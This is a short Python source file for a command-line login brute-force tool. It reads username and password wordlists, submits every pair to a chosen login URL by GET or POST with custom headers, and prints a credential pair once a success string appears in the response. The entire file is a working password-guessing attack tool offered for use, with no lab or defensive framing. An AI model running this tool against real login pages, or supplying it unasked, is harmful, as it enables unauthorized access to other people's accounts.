import requests
import argparse

def brute_force(url, method, user_param, pass_param, usernames, passwords, success_indicator, headers):
    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            if not username or not password:
                continue

            data = {
                user_param: username,
                pass_param: password,
                "Login": "Login"  
            }

            if method.upper() == "POST":
                response = requests.post(url, data=data, headers=headers)
            else:
                response = requests.get(url, params=data, headers=headers)

            if success_indicator in response.text:
                print(f"[SUCCESS] Username: '{username}' Password: '{password}'")
                return
            else:
                print(f"[FAILED] Username: '{username}' Password: '{password}'")

def load_wordlist(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple URL Brute Force Tool")
    parser.add_argument("--url", required=True)
    parser.add_argument("--method", choices=['GET', 'POST'], default="POST")
    parser.add_argument("--userparam", required=True)
    parser.add_argument("--passparam", required=True)
    parser.add_argument("--userfile", required=True)
    parser.add_argument("--passfile", required=True)
    parser.add_argument("--success", required=True)
    parser.add_argument("--header", action='append', help="Custom header in 'Key: Value' format", default=[])

    args = parser.parse_args()

    headers = {}
    for header in args.header:
        if ':' in header:
            key, value = header.split(":", 1)
            headers[key.strip()] = value.strip()

    usernames = load_wordlist(args.userfile)
    passwords = load_wordlist(args.passfile)

    brute_force(
        url=args.url,
        method=args.method,
        user_param=args.userparam,
        pass_param=args.passparam,
        usernames=usernames,
        passwords=passwords,
        success_indicator=args.success,
        headers=headers
    )
